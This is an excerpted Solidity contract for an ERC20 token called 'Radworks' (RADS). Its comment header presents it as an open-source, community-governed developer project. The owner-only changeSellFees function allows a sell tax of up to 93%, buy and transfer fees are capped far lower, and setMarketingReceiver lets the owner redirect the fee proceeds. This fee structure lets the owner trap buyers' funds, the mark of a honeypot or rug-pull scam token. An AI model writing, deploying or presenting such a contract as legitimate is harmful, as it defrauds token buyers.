 ...
 * SPDX-License-Identifier: MIT
  ...
  Radworks is building a sovereign developer stack that enables developers to securely host, collaborate, and reward open-source code. 
  It operates as a community-governed network that uses both and off- and on-chain governance mechanisms to make decisions as a community.

  Website  : https://radworks.org/
  Telegram : https://t.me/radworksgroup
...
abstract contract Ownable is Context {
     ...
     */
    function waiveOwnerships() public virtual onlyOwner {
...
contract RADS is ERC20, Ownable {
    ...
    constructor() ERC20("Radworks", "RADS") {
        ...
        maxTransactionLimit = (_totalSupply * 20) / 1000;
        maxWalletLimit = (_totalSupply * 20) / 1000;

        triggerSwap = (_totalSupply * 1) / 1000;
        limitSwap = (_totalSupply * 2) / 100;
    ...
    function setSwapbackSetting(
        ...
        triggerSwap = (totalSupply() * _caSBcTrigger) / 10000;
        limitSwap = (totalSupply() * _caSBcLimit) / 10000;
    ...
    function changeBuyFee(uint256 _value) external onlyOwner {
        buyingFee = _value;
        require(buyingFee <= 8, "Total buy fee cannot be higher than 10%");
     ...
     * @param _value The fee for the marketing wallet
     */
    function changeSellFees(uint256 _value) external onlyOwner {
        sellingFee = _value;
        require(
            sellingFee <= 93,
    ...
    function setTaxTransfer(uint256 _value) external onlyOwner {
        transferFee = _value;
        require(
            transferFee <= 0,
    ...
    function setMarketingReceiver(address _marketing) external onlyOwner {
        emit MarketingWalletUpdated(_marketing, radworks);
        radworks = _marketing;
    }
        ...
        )
    {
        ...
        _caSBcackValueMin = triggerSwap;
        _caSBcackValueMax = limitSwap;
    }
     ...
     * @return _radworks The wallet that receives the marketing fees
     */
    function readFeeReceiver()
        external
        view
        returns (address _radworks)
    {
        return (radworks);
    }
    ...
    function swapBack(uint256 amount) private {
        ...
        if (contractBalance > limitSwap) {
            contractBalance = limitSwap;
        }
